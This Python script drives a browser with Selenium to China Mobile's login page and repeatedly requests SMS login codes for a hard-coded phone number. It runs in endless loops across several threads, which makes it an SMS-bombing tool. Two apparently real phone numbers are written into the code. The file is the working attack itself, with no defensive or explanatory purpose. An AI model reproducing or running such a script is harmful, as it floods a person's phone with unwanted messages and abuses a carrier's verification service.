# -*- coding: utf-8 -*-
import threading
import urllib

from bs4 import BeautifulSoup
from scrapy.http import HtmlResponse

from tencent.utils.common import *

# 线程数
thread_num = 3
num = "18813030755"

## my
# num = "15110102180"
# thread_num = 20


def send(num):
    browser = webdriver.Chrome(executable_path=get_chrome_executable_path(), chrome_options=chrome_option())
    browser.get("https://login.10086.cn/login.html")
    time.sleep(1)
    browser.find_element_by_id("sms_login_1").click()
    browser.find_element_by_xpath("//*[@id=\"sms_name\"]").send_keys(num)
    browser.find_element_by_xpath("//*[@id=\"getSMSPwd1\"]").click()
    time.sleep(1)
    browser.quit()


lock = threading.Lock()


def loop(imgs):
    print('thread %s is running...' % threading.current_thread().name)
    while True:
        try:
            send(num)
        except:
            print('exceptfail\t%s' % num)

    print('thread %s is end...' % threading.current_thread().name)



for i in range(0, thread_num):
    t = threading.Thread(target=loop, name='LoopThread %s' % i, args=(num,))
    t.start()
